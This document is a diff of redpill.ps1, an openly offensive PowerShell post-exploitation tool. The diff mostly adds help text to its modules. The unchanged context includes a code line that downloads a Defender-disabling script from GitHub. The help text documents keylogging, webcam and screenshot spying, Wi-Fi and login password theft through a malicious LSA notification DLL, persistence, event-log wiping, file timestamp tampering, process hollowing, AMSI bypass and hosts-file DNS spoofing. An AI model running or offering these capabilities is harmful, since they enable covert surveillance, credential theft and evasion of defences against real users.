@@ -2143,7 +2143,7 @@ If($DisableAV -ne "false"){
       Start-BitsTransfer -priority foreground -Source https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/bin/DisableDefender.ps1 -Destination $Env:TMP\DisableDefender.ps1 -ErrorAction SilentlyContinue|Out-Null
       ## Check downloaded file integrity => FileSizeKBytes
       $SizeDump = ((Get-Item -Path "$Env:TMP\DisableDefender.ps1" -EA SilentlyContinue).length/1KB)
-      If($SizeDump -lt 7){## Corrupted download detected => DefaultFileSize: 7,2431640625/KB
+      If($SizeDump -lt 7){## Corrupted download detected => DefaultFileSize: 7,265625/KB
          Write-Host "[error] Abort, Corrupted download detected" -ForegroundColor Red -BackgroundColor Black
          If(Test-Path -Path "$Env:TMP\DisableDefender.ps1"){Remove-Item -Path "$Env:TMP\DisableDefender.ps1" -Force}
          Write-Host "";Start-Sleep -Seconds 1;exit ## EXit @redpill
@@ -2178,6 +2178,9 @@ $HelpParameters = @"
       PSCommandLogging, AntiVirusDefinitions, AntiSpywearDefinitions,
       UACsettings, WorkingDirectoryDACL, BehaviorMonitorEnabled, Etc..
 
+   .Parameter SysInfo
+      Accepts arguments: Enum and Verbose
+
    .EXAMPLE
       PS C:\> powershell -File redpill.ps1 -SysInfo Enum
       Remote Host Quick Enumeration Module
@@ -2196,13 +2199,17 @@ $HelpParameters = @"
    .SYNOPSIS
       Author: @r00t-3xp10it
       Helper - Enumerate remote host DNS cache entrys
+
+   .Parameter GetDnsCache
+      Accepts arguments: Enum and Clear
       
    .EXAMPLE
       PS C:\> powershell -File redpill.ps1 -GetDnsCache Enum
+      Enumerate ALL dns cache entrys
 
    .EXAMPLE
       PS C:\> powershell -File redpill.ps1 -GetDnsCache Clear
-      Clear Dns Cache entrys {delete entrys}
+      Clear Dns Cache entrys {delete all entrys}
 
    .OUTPUTS
       Entry                           Data
@@ -2226,6 +2233,9 @@ $HelpParameters = @"
    .DESCRIPTION
       Enumerates ESTABLISHED TCP connections and retrieves the
       ProcessName associated from the connection PID (Id) identifier
+
+   .Parameter GetConnections
+      Accepts arguments: Enum and Verbose
     
    .EXAMPLE
       PS C:\> powershell -File redpill.ps1 -GetConnections Enum
@@ -2261,6 +2271,9 @@ $HelpParameters = @"
 
    .DESCRIPTION
       Enumerates appl installed and respective versions
+
+   .Parameter GetInstalled
+      Accepts argument: Enum
 
    .EXAMPLE
       PC C:\> powershell -File redpill.ps1 -GetInstalled Enum
@@ -2345,8 +2358,21 @@ $HelpParameters = @"
       Remark: Module parameters are auto-set {default}
       Remark: Tasks have the default duration of 9 hours.
 
+   .Parameter GetTasks
+      Accepts arguments: Enum, Create and Delete
+
+   .Parameter TaskName
+      Accepts the name of the task to be created
+
+   .Parameter Interval
+      Accepts the interval time (minuts) between each task execution
+
+   .Parameter Exec
+      Accepts the cmdline command to be executed through task
+
    .EXAMPLE
       PS C:\> powershell -File redpill.ps1 -GetTasks Enum
+      Enumerate ALL ready\running tasks
 
    .EXAMPLE
       PS C:\> powershell -File redpill.ps1 -GetTasks Create
@@ -2384,13 +2410,19 @@ $HelpParameters = @"
       The Clear @argument requires Administrator privs
       on shell to be abble to 'Clear' Eventvwr entrys.
 
+   .Parameter GetLogs
+      Accepts arguments: Enum, Verbose and Clear
+
+   .Parameter NewEst
+      How many logfiles (newest) to be displayed (default: 10)
+
    .EXAMPLE
       PS C:\> powershell -File redpill.ps1 -GetLogs Enum
       Lists ALL eventvwr categorie entrys
 
    .EXAMPLE
       PS C:\> powershell -File redpill.ps1 -GetLogs Verbose
-      List the newest 10 (default) Powershell\Application\System entrys
+      List the newest 10 Powershell\Application\System entrys
 
    .EXAMPLE
       PS C:\> powershell -File redpill.ps1 -GetLogs Verbose -NewEst 28
@@ -2425,7 +2457,7 @@ $HelpParameters = @"
       And identify install browsers and run enum modules.
 
    .Parameter GetBrowsers
-      Accepts: Enum, Verbose and Creds @arguments.
+      Accepts arguments: Enum, Verbose and Creds
 
    .EXAMPLE
       PS C:\> powershell -File redpill.ps1 -GetBrowsers Enum
@@ -2461,6 +2493,12 @@ $HelpParameters = @"
       This module can be used to take only one screenshot
       or to spy target user activity using -Delay parameter.
 
+   .Parameter Screenshot
+      Accepts how many screenshot to be taken (default: 1)
+
+   .Parameter Delay
+      Accepts the delay time (sec) between each capture
+
    .EXAMPLE
       PS C:\> powershell -File redpill.ps1 -Screenshot 1
       Capture 1 desktop screenshot and store it on %TMP%.
@@ -2483,7 +2521,7 @@ $HelpParameters = @"
    <#!Help.
    .SYNOPSIS
       Author: @tedburke|@r00t-3xp10it
-      Helper - List computer device names or capture snapshot
+      Helper - List computer webcam device names or capture snapshot
 
    .NOTES
       Remark: WebCam turns the ligth 'ON' taking snapshots.
@@ -2491,6 +2529,9 @@ $HelpParameters = @"
       Unless target system has powershell version 2 available.
       In that case them PS version 2 will be used to execute
       our binary file and bypass AV amsi detection.
+
+   .Parameter Camera
+      Accepts arguments: Enum and Snap
 
    .EXAMPLE
       PS C:\> powershell -File redpill.ps1 -Camera Enum
@@ -2557,8 +2598,15 @@ $HelpParameters = @"
       Required Attacker Dependencies: apache2 webroot
       Required Target Dependencies: BitsTransfer {native}
       File to Download must be stored in attacker apache2 webroot.
-      -Upload and -ApacheAddr Are Mandatory parameters (required).
-      -Destination parameter its auto set to `$Env:TMP by default.
+
+   .Parameter Upload
+      Accepts the file name of file to be uploaded
+
+   .Parameter ApacheAddr
+      Accepts the attacker apache2 ip address
+
+   .Parameter Destination
+      Accepts the Absoluct \ relative path of file to upload storage (default: `$Env:TMP)
 
    .EXAMPLE
       Syntax : .\redpill.ps1 -Upload [ file.ps1 ] -ApacheAddr [ Attacker ] -Destination [ full\Path\file.ps1 ]
@@ -2583,6 +2631,9 @@ $HelpParameters = @"
 
    .NOTES
       Required Dependencies: void.exe {auto-install}
+
+   .Parameter Keylogger
+      Accepts arguments: Start and Stop
 
    .EXAMPLE
       PS C:\> powershell -File redpill.ps1 -Keylogger Start
@@ -2610,13 +2661,18 @@ $HelpParameters = @"
       Helper - Capture screenshots of MouseClicks for 'xx' Seconds
 
    .DESCRIPTION
-      This script allow users to Capture Screenshots of 'MouseClicks'
-      with the help of psr.exe native windows 10 (error report service).
+      This script allow users to Capture Screenshots of 'MouseClicks'.
       Remark: Capture will be stored under '`$Env:TMP' remote directory.
       'Min capture time its 8 secs the max is 300 and 100 screenshots'.
 
    .NOTES
       Required Dependencies: psr.exe {native}
+
+   .Parameter MouseLogger
+      Accepts argument: Start
+
+   .Parameter Timmer
+      The time used to record mouse clicks (default: 10)
 
    .EXAMPLE
       PS C:\> powershell -File redpill.ps1 -Mouselogger Start
@@ -2699,6 +2755,9 @@ $HelpParameters = @"
       Remark: Attacker needs to manualy download\execute the POC.
       Sherlock.ps1 GitHub WIKI page: https://tinyurl.com/y4mxe29h
 
+   .Parameter EOP
+      Accepts arguments: Enum and Verbose
+
    .EXAMPLE
       PS C:\> powershell -File redpill.ps1 -EOP Enum
       Scans GroupName Everyone and permissions (F)
@@ -2733,10 +2792,14 @@ $HelpParameters = @"
       its to execute our script on every startup from 'xx' to 'xx' seconds.
 
    .NOTES
-      Remark: Use double quotes if Path has any empty spaces in name.
-      Remark: '-GetProcess Enum -ProcessName Wscript.exe' can be used
-      to manual check the status of wscript process (BeaconHome function)
       Remark: Payload supported extensions: ps1|exe|py|vbs|bat
+      Remark: Use double quotes if Path has any empty spaces in name.
+
+   .Parameter Persiste
+      Accepts arguments: Stop or Payload absoluct path
+
+   .Parameter BeaconTime
+      Accepts the interval time (sec) between each Payload execution
 
    .EXAMPLE
       PS C:\> powershell -File redpill.ps1 -Persiste Stop
@@ -2780,6 +2843,12 @@ $HelpParameters = @"
    .NOTES
       Required Dependencies: netsh {native}
 
+   .Parameter WifiPasswords
+      Accepts arguments: Dump and ZipDump
+
+   .Parameter Storage
+      The directory path where to store the zip dump archive
+
    .EXAMPLE
       PS C:\> powershell -File redpill.ps1 -WifiPasswords Dump
       Dump ALL Wifi Passwords on this terminal prompt
@@ -2820,9 +2889,18 @@ $HelpParameters = @"
       Remark: -Volume controls the speach volume {default: 88}
       Remark: -Rate Parameter configs the SpeechSynthesizer speed
 
+   .Parameter SpeakPrank
+      Accepts the frase (string) to speak
+
+   .Parameter Volume
+      Accepts the speach volume (default: 88)
+
+   .Parameter Rate
+      Accepts the SpeechSynthesizer speed (default: 1)
+
    .EXAMPLE
       PS C:\> powershell -File redpill.ps1 -SpeakPrank "Hello World"
-      Make remote host speak "Hello World" {-Rate 1 -Volume 88}
+      Make remote host speak "Hello World" using @redpill default settings
 
    .EXAMPLE
       PS C:\> powershell -File redpill.ps1 -SpeakPrank "Hello World" -Rate 5 -Volume 100
@@ -2859,6 +2937,7 @@ $HelpParameters = @"
 
    .EXAMPLE
       PS C:\> powershell -File redpill.ps1 -MsgBox "Hello World."
+      Spawns message box with @redpill default settings
 
    .EXAMPLE
       PS C:\> powershell -File redpill.ps1 -MsgBox "Hello World." -TimeOut 4
@@ -2894,6 +2973,9 @@ $HelpParameters = @"
       Required Dependencies: `$Env:TMP\passwords.txt {auto|manual}
       Remark: Use double quotes if path contains any empty spaces.
 
+   .Parameter BruteZip
+      Accepts the absoluct \ relative path of zip archive to brute
+
    .EXAMPLE
       PS C:\> powershell -File redpill.ps1 -BruteZip `$Env:USERPROFILE\Desktop\redpill.zip
       Brute forces the zip archive defined by -BruteZip parameter with 7z.exe bin.
@@ -2926,6 +3008,9 @@ $HelpParameters = @"
       Paranoid @argument deletes @redpill auxiliary
       scripts and Deletes All eventvwr logs {admin privs}
 
+   .Parameter CleanTracks
+      Accepts arguments: Clear and Paranoid
+
    .EXAMPLE
       PS C:\> powershell -File redpill.ps1 -CleanTracks Clear
       Basic cleanning {flushdns,Prefetch,Recent,tmp *log|*bat|*vbs}
@@ -2948,20 +3033,25 @@ $HelpParameters = @"
    <#!Help.
    .SYNOPSIS
       Author: @mubix|@r00t-3xp10it
-      Helper - Stealing passwords every time they change {mitre T1174}
+      Helper - Stealing passwords every time they change {MITRE T1174}
       Helper - Search for creds in diferent locations {store|regedit|disk}
 
    .DESCRIPTION
       -GetPasswords [ Enum ] searchs creds in store\regedit\disk diferent locations.
       -GetPasswords [ Dump ] Explores a native OS notification of when the user
       account password gets changed which is responsible for validating it.
-      That means that the user password can be intercepted and logged.
 
    .NOTES
       -GetPasswords [ Dump ] requires Administrator privileges to add reg keys
       To stop this exploit its required the manual deletion of '0evilpwfilter.dll'
       from 'C:\Windows\System32' and the reset of 'HKLM:\..\Control\lsa' registry key.
       REG ADD "HKLM\System\CurrentControlSet\Control\lsa" /v "notification packages" /t REG_MULTI_SZ /d scecli /f
+
+   .Parameter GetPasswords
+      Accepts arguments: Enum and Dump
+
+   .Parameter StartDir
+      The directory path where to start search recursive for files
 
    .EXAMPLE
       PS C:\> powershell -File redpill.ps1 -GetPasswords Enum
@@ -2999,6 +3089,12 @@ $HelpParameters = @"
       -Date parameter format: "08 March 1999 19:19:19"
       Remark: Double quotes are mandatory in -Date [ @argument ]
 
+   .Parameter FileMace
+      Accepts the absoluct \ relative path of file to modify
+
+   .Parameter Date
+      Accepts the timestamp data-format to modify file
+
    .EXAMPLE
       PS C:\> powershell -File redpill.ps1 -FileMace `$Env:TMP\test.txt
       Changes sellected file mace using redpill default -Date [ "data-format" ]
@@ -3029,6 +3125,12 @@ $HelpParameters = @"
    .NOTES
       -Extension [ exe ] parameter its used to recursive search starting in -MetaData
       directory for standalone executables (exe) and display is property descriptions.
+
+   .Parameter MetaData
+      Accepts the absoluct \ relative path of file \ appl to scan
+
+   .Parameter Extension
+      Used to recursive search for file extensions and displays metadata
 
    .EXAMPLE
       PS C:\> powershell -File redpill.ps1 -MetaData "`$Env:USERPROFILE\Desktop\CommandCam.exe"
@@ -3071,8 +3173,14 @@ $HelpParameters = @"
 
    .NOTES
       Required Dependencies: netsh {native}
-      Remark: Administrator privilges required on shell
+      Required Dependencies: Administrator privilges on shell
       Remark: Dump will be saved under %TMP%\NetTrace.cab {default}
+
+   .Parameter NetTrace
+      Accepts argument: Enum
+
+   .Parameter Storage
+      Where to store the dump zip archive (default: %tmp%)
       
    .EXAMPLE
       PS C:> powershell -File redpill.ps1 -NetTrace Enum
@@ -3191,14 +3299,11 @@ $HelpParameters = @"
    <#!Help.
    .SYNOPSIS
       Author: @FuzzySecurity|@r00t-3xp10it
-      Helper - Process Hollowing with powershell
+      Helper - Process Hollowing with powershell {MITRE T1055}
 
    .DESCRIPTION
       This Module uses PowerShell to create a Hollow from a PE
       on disk with explorer as the parent. Credits: @FuzzySecurity
-
-   .NOTES
-      Supported Platforms: Windows
 
    .Parameter PEHollow
       Accepts the executable {payload.exe} absoluct \ relative path
@@ -3306,7 +3411,7 @@ $HelpParameters = @"
       Redirecting Domains Using hosts File (Dns Spoofing)
       Clean dns cache before adding entry to hosts file.
       Redirect Domain: www.facebook.com TO IPADDR: 192.168.1.72
-
+      ---------------------------------------------------------
       # This file contains the mappings of IP addresses to host names. Each
       # entry should be kept on an individual line. The IP address should
       # be placed in the first column followed by the corresponding host name.
